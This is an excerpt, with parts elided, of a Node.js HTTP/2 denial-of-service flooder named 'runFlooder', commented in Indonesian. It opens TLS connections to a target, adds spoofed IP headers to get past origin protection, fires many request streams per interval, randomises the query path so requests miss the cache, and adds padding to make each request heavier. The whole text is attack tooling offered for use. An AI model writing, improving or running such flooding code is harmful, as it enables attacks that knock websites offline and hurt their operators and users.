...
function runFlooder() {
    ...
    // ===== BYPASS ORIGIN HIT: tambah header spoofing IP ekstra =====
    const bypassHeaders = [
        ...
        const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions, () => {
            ...
            client.on("connect", () => {
                const interval = setInterval(() => {
                    // ===== BYPASS ORIGIN HIT: kirim banyak stream per interval =====
                    const streamsPerInterval = Math.max(1, Math.floor(args.Rate / 2));
                    for (let s = 0; s < streamsPerInterval; s++) {
                        // random path tiap stream biar ga kena cache
                        const dynamicPath = (parsedTarget.path || "/") + "?" + randstr(8) + "=" + generateRandomString(18, 28) + "&" + randstr(5) + "=" + generateRandomString(12, 20);
                        ...
                        try {
                            const req = client.request(dynamicHeaders, {
                                ...
                                exclusive: true,
                                weight: 220,
                                padding: Math.floor(Math.random() * 32) // tambah padding biar berat
                            });
